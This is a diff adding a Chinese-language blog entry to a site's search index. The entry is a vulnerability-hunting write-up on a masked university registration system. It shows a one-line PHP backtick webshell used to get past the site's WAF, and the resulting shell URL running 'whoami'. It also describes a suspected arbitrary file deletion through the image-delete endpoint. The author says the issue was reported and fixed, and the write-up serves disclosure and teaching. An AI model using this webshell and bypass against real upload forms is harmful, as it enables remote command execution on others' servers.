@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>EDUSRC-漏洞挖掘案例（一）</title>
+      <link href="/2020/09/25/Edusrc-Vulnerability-mining-1/"/>
+      <url>/2020/09/25/Edusrc-Vulnerability-mining-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="EDUSRC-漏洞挖掘案例（一）"><a href="#EDUSRC-漏洞挖掘案例（一）" class="headerlink" title="EDUSRC-漏洞挖掘案例（一）"></a>EDUSRC-漏洞挖掘案例（一）</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote><p>在发现此漏洞后，第一时间联系了该大学的信息中心老师，并且该系统当晚就完成了修复。</p><p>本文的初衷就是分享网络安全知识，若有读者因此做出任何危害网络安全的行为，请后果自负。</p></blockquote><p>系统地址:<a href="http://xxx.xxx.edu.cn/index.php/index/login" target="_blank" rel="noopener">http://xxx.xxx.edu.cn/index.php/index/login</a></p><p>报名申请页面:<a href="http://xxx.xxx.edu.cn/register" target="_blank" rel="noopener">http://xxx.xxx.edu.cn/register</a></p><h2 id="一、任意文件上传漏洞"><a href="#一、任意文件上传漏洞" class="headerlink" title="一、任意文件上传漏洞"></a>一、任意文件上传漏洞</h2><p>报名申请页面有一处上传图片的功能</p><p><img src="/img/2020/09/25/faad789e-71ef-4ffc-bfb0-f32c4708c466.png" alt></p><p>然后我们上传一个正常的图片，会提示需要输入身份证号才行</p><p><img src="/img/2020/09/25/0273dc24-0cfc-4ba9-815c-b0179607ca02.png" alt></p><p>然后随便输一个身份证号就行</p><p>例如：<code>110999199901011111</code></p><p>成功上传后会返回此文件在服务器上的路径</p><p><img src="/img/2020/09/25/174ade2b-11fe-4c1b-ad9e-6265eb072962.png" alt></p><p>改后缀为<code>.php</code>也可以上传成功，不过网站的waf会对上传文件的内容做检查，当出现<code>php</code>、<code>$_GET</code>、<code>$_POST</code>等php相关函数时会直接报错，提示文件有威胁。</p><p><img src="/img/2020/09/25/c6c3dde1-85ec-4d55-aff8-41d76b51b9f6.png" alt></p><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>姿势挺多的，这里找了一种，直接用反引号执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[1]`;</span><br></pre></td></tr></table></figure><p>上传成功。</p><p><img src="/img/2020/09/25/50a49672-d9c9-49b6-9175-af6d3e26dd1d.png" alt></p><h3 id="shell地址："><a href="#shell地址：" class="headerlink" title="shell地址："></a>shell地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.edu.cn/public/uploads/registers/110999199901011111/100.php?1=whoami</span><br></pre></td></tr></table></figure><p><img src="/img/2020/09/25/30314091-9f5e-49ef-945c-71feda8e7d6e.png" alt></p><p><img src="/img/2020/09/25/6b58e4fd-b497-4131-89db-d5f4611cf308.png" alt></p><p><strong>未深入测试。</strong></p><h2 id="二、任意文件删除漏洞"><a href="#二、任意文件删除漏洞" class="headerlink" title="二、任意文件删除漏洞"></a>二、任意文件删除漏洞</h2><p>这个洞没仔细测，因为会删除服务器上的文件，比较敏感，怀疑是有的。</p><p>漏洞出现在删除上传图片的功能处，上传一个文件，删除时抓包会抓到删除接口</p><p><img src="/img/2020/09/25/ab22a6fe-1580-4e02-9ce6-4a084918dd99.png" alt></p><p><img src="/img/2020/09/25/e304ff29-db1d-4874-a4b6-4f8679b4d5fb.png" alt></p><p>经过<code>Urldecode</code>发现是真实路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/html/public/uploads/registers/110000100000000000/100.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/2020/09/25/96a0011d-140c-4768-b555-30d1fcb64b51.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞挖掘 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞挖掘 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>八月，CTF练习-Web</title>
       <link href="/2020/08/30/CTF-August-Practice-Web/"/>
       <url>/2020/08/30/CTF-August-Practice-Web/</url>
